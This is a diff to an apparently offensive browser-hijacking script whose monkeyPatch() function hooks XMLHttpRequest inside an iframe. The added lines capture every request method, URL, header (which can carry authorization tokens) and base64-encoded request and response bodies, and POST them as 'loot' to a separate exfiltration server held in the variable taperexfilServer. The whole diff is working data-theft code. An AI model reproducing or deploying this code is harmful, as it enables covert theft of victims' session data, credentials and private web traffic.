@@ -570,6 +570,20 @@ function monkeyPatch()
 		var url = arguments[1];
 
 		console.log("Intercepted XHR open: " + method + ", " + url);
+
+
+		// send loot
+		request = new XMLHttpRequest();
+		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + tapersessionName);
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+		var jsonObj = new Object();
+		jsonObj["method"] = method;
+		jsonObj["url"]    = url;
+		var jsonString    = JSON.stringify(jsonObj);
+		request.send(jsonString);
+	
+
 		xhrOriginalOpen.apply(this, arguments);
 	}
 
@@ -585,6 +599,18 @@ function monkeyPatch()
 
 		console.log("Intercepted Header = " + header + ": " + value);
 
+
+		request = new XMLHttpRequest();
+		request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + tapersessionName);
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+		var jsonObj = new Object();
+		jsonObj["header"] = header;
+		jsonObj["value"]  = value;
+		var jsonString    = JSON.stringify(jsonObj);
+		request.send(jsonString);
+
+
 		xhrOriginalSetHeader.apply(this, arguments);
 	}
 
@@ -593,6 +619,8 @@ function monkeyPatch()
 	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) 
 	{
 		console.log("Intercepted request body: " + data);
+
+		var requestBody = btoa(data);
 
 
 		this.onreadystatechange = function()
@@ -618,8 +646,19 @@ function monkeyPatch()
 					data = xhr.response;
 				}
 
+				var responseBody = btoa(data);
 				// var response = read_body(this);
 				console.log("Intercepted response: " + data);
+
+				request = new XMLHttpRequest();
+				request.open("POST", taperexfilServer + "/loot/xhrCall/" + tapersessionName);
+				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+				var jsonObj = new Object();
+				jsonObj["requestBody"]  = requestBody;
+				jsonObj["responseBody"] = responseBody;
+				var jsonString          = JSON.stringify(jsonObj);
+				request.send(jsonString);
 			}
 		};
 
